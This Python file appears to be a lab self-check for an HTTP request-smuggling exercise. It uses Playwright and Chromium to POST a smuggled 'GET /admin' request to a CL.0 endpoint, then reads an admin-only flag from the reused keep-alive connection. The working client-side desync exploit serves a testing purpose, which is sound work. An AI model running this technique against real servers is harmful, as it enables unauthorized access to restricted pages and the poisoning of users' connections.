"""Self-check for the CLIENT-SIDE desync lab (class 4), driven by a real browser.

Proves the browser desyncs its OWN keep-alive connection: it fetch()-POSTs a smuggled
GET /admin to the CL.0 /beacon (which the server answers without reading the body), then
navigates to / on the reused connection and receives the /admin page (the flag) instead
of the landing page.

Needs Playwright + a Chromium build (run inside a Kali sandbox, which has both, with the
lab connected to that sandbox's network):
  python3 tests/verify_clientside.py http://cs-guinea-server:5000
"""
import re
import sys

from playwright.sync_api import sync_playwright

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:9100"


def main():
    with sync_playwright() as p:
        browser = p.chromium.launch(args=["--disable-http2"])
        ctx = browser.new_context()
        page = ctx.new_page()

        # baseline: a normal navigation returns the landing page (no flag)
        page.goto(BASE + "/", wait_until="load", timeout=15000)
        baseline = page.content()
        assert "REDAMON_HRS{" not in baseline, "landing already exposes the flag"

        # poison: fetch-POST a smuggled GET /admin to the CL.0 beacon on the reused conn
        smuggled = "GET /admin HTTP/1.1\\r\\nHost: %s\\r\\n\\r\\n" % page.evaluate("location.host")
        page.evaluate(
            """async (smuggled) => {
                 await fetch('/beacon', {method:'POST', body: smuggled,
                             headers:{'Content-Type':'text/plain'}});
               }""",
            smuggled,
        )

        # navigate on the reused connection -> should receive the smuggled /admin response
        flag = None
        for _ in range(4):
            page.goto(BASE + "/", wait_until="load", timeout=15000)
            body = page.content()
            m = re.search(r"REDAMON_HRS\{[^}]*\}", body)
            if m:
                flag = m.group(0)
                break
        browser.close()

    assert flag, "client-side desync did not surface /admin on a reused-connection navigation"
    print("OK: client-side desync confirmed; navigation returned /admin flag:", flag)


if __name__ == "__main__":
    main()
